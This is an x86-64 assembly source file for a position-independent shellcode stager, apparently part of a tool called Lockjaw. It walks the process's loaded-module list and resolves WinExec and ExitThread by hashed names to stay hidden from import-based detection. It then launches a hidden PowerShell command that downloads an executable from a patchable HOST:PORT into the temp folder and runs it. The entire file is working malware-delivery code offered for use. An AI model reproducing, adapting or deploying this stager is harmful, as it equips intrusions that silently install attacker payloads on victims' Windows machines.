# PIC PowerShell Stager for Lockjaw
# v0.1.0 - Resolves WinExec and runs PS downloader

.section .text$A, "ax"
.global entry

entry:
    # 1. Immediate Jump to skip the configuration header
    .byte 0xeb, 0x0e
    nop
    nop
    
    # --- Configuration Header (Fixed Offsets for patching) ---
    # Offset 0x04: KernelBase Hash (4 bytes)
    # Offset 0x08: Kernel32 Hash (4 bytes)
    # Offset 0x0C: Ntdll Hash (4 bytes)
config_kbase_hash: .long 0xAAAAAAAA 
config_k32_hash:   .long 0xBBBBBBBB
config_ntdll_hash: .long 0xCCCCCCCC
    # Total header = 16 bytes.

stager_init:
    # Standard x64 Prologue & Alignment
    movq %rsp, %rax
    andq $-16, %rsp
    subq $0x200, %rsp            # Minimal stack frame
    movq %rax, 0x10(%rsp)        # Save original RSP

    # Load dynamic module hashes
    lea config_kbase_hash(%rip), %rax
    movl (%rax), %r13d           # r13d = Dynamic KernelBase Hash
    movl 4(%rax), %r14d          # r14d = Dynamic Kernel32 Hash
    movl 8(%rax), %r15d          # r15d = Dynamic Ntdll Hash

stager_start:
    # 3. Resolve Base Modules (KernelBase, Kernel32, ntdll)
    movq %gs:0x60, %rax
    movq 0x18(%rax), %rax
    leaq 0x10(%rax), %r12    # r12 = head of InLoadOrderModuleList
    movq %r12, %r11          # r11 = current entry

find_mod_loop:
    movq (%r11), %r11        # Move to next entry
    cmpq %r12, %r11          # Back to head?
    je mods_done

    movq 0x50(%r11), %rdx    # Buffer (FullDllName UNICODE_STRING)
    testq %rdx, %rdx
    jz find_mod_loop
    movzwq 0x48(%r11), %rcx  # Length (bytes)
    shr $1, %rcx             # Length (chars)

    # Isolate filename (scan backwards)
    movq %rdx, %rax
    movq %rax, %rsi
    leaq (%rax, %rcx, 2), %rsi # rsi points to end of string
    movq %rax, %r8             # default start
find_slash_back_loop:
    cmpq %rax, %rsi
    je find_slash_done
    subq $2, %rsi
    movzwl (%rsi), %edx
    cmpl $0x5c, %edx           # '\'
    je found_slash_back
    cmpl $0x2f, %edx           # '/'
    je found_slash_back
    jmp find_slash_back_loop
found_slash_back:
    leaq 2(%rsi), %r8
find_slash_done:
    movq %r8, %rdx             # filename buffer

    # Calculate length: original_end - r8
    movq 0x50(%r11), %rax      # original buffer
    movzwq 0x48(%r11), %rcx    # original byte length
    addq %rax, %rcx            # original end ptr
    subq %r8, %rcx             # filename byte length
    shr $1, %rcx               # filename char length

    # robust hash: case-insensitive djb2
    xorq %r10, %r10
    movl $5381, %r10d
mod_hash_loop:
    testq %rcx, %rcx
    jz mod_check
    movzwq (%rdx), %rax
    andl $0xFF, %eax
    cmpb $'A', %al
    jl mod_hash_next
    cmpb $'Z', %al
    jg mod_hash_next
    addb $32, %al
mod_hash_next:
    imull $33, %r10d
    addl %eax, %r10d
    addq $2, %rdx
    decq %rcx
    jmp mod_hash_loop

mod_check:
    cmpl %r13d, %r10d        # KB
    jne check_k32
    movq 0x30(%r11), %rax
    movq %rax, %r13          # r13 = hKBase
    jmp find_mod_loop
check_k32:
    cmpl %r14d, %r10d        # K32
    jne find_mod_loop
    movq 0x30(%r11), %rax
    movq %rax, %r14          # r14 = hK32
    jmp find_mod_loop

mods_done:
    # 4. Resolve WinExec and ExitThread
    testq %r13, %r13         # hKBase
    jz fail_exit

    movq %r13, %rcx          # hKBase
    movl $0x29a65678, %edx   # WinExec
    call resolve_api
    movq %rax, %r12          # r12 = WinExec
    testq %rax, %rax
    jnz winexec_ok
    # Try Kernel32
    movq %r14, %rcx
    movl $0x29a65678, %edx
    call resolve_api
    movq %rax, %r12
winexec_ok:

    movq %r13, %rcx          # hKBase
    movl $0x7acb5457, %edx   # ExitThread
    call resolve_api
    movq %rax, %r15          # r15 = ExitThread
    testq %rax, %rax
    jnz exitthread_ok
    # Try Kernel32
    movq %r14, %rcx
    movl $0x7acb5457, %edx
    call resolve_api
    movq %rax, %r15
exitthread_ok:

    # 5. Execute PowerShell Command
    # We need to construct the command string with the host and port.
    # For now, let's use a simpler one-liner that can be patched if needed,
    # but the Agent usually patches the Host/Port into the config header.
    # Since WinExec takes a simple string, we'll use a pre-formatted one
    # that build.zig will patch.

    testq %r12, %r12         # WinExec found?
    jz fail_exit

    lea ps_cmd(%rip), %rcx
    movl $0, %edx            # SW_HIDE = 0
    subq $0x20, %rsp
    call *%r12               # WinExec(cmd, 0)
    addq $0x20, %rsp

    # ExitThread(0)
    testq %r15, %r15
    jz hard_ret
    xorl %ecx, %ecx
    subq $0x20, %rsp
    call *%r15
    addq $0x20, %rsp

fail_exit:
hard_ret:
    ret

# --- resolve_api(module:rcx, hash:edx) ---
resolve_api:
    pushq %rbx
    pushq %rdi
    pushq %rsi
    movq %rcx, %r8           # base
    movl %edx, %r9d          # target_hash
    movl 0x3c(%r8), %eax
    addq %r8, %rax           # NT Headers
    movl 0x88(%rax), %eax    # Export RVA
    testl %eax, %eax
    jz api_fail
    addq %r8, %rax           # Export Dir
    movq %rax, %rbx
    movl 0x18(%rbx), %ecx    # NumNames
    movl 0x20(%rbx), %edi
    addq %r8, %rdi           # AddressOfNames
    xorq %r10, %r10          # Index
api_loop:
    cmpl %ecx, %r10d
    je api_fail
    movl (%rdi, %r10, 4), %eax
    addq %r8, %rax           # Name string
    xorq %r11, %r11          # scratch for hash
    movl $5381, %r11d
hash_loop_api:
    movb (%rax), %sil
    testb %sil, %sil
    jz hash_done_api
    imull $33, %r11d
    movzx %sil, %esi
    addl %esi, %r11d
    incq %rax
    jmp hash_loop_api
hash_done_api:
    cmpl %r9d, %r11d
    je found_api
    incq %r10
    jmp api_loop
found_api:
    movl 0x24(%rbx), %eax
    movq %rax, %rdi
    addq %r8, %rdi
    movzwl (%rdi, %r10, 2), %eax # ordinal
    movl 0x1c(%rbx), %edx
    movq %rdx, %rdi
    addq %r8, %rdi
    movl (%rdi, %rax, 4), %eax
    addq %r8, %rax
    jmp api_exit
api_fail:
    xorq %rax, %rax
api_exit:
    popq %rsi
    popq %rdi
    popq %rbx
    ret

ps_cmd: .string "powershell -w hidden -c \"$w=New-Object System.Net.WebClient;$f=\\\"$env:TEMP\\lj.exe\\\";$w.DownloadFile(\\\"http://HOST:PORT/stage\\\",\\\"$f\\\");Start-Process \\\"$f\\\"\""
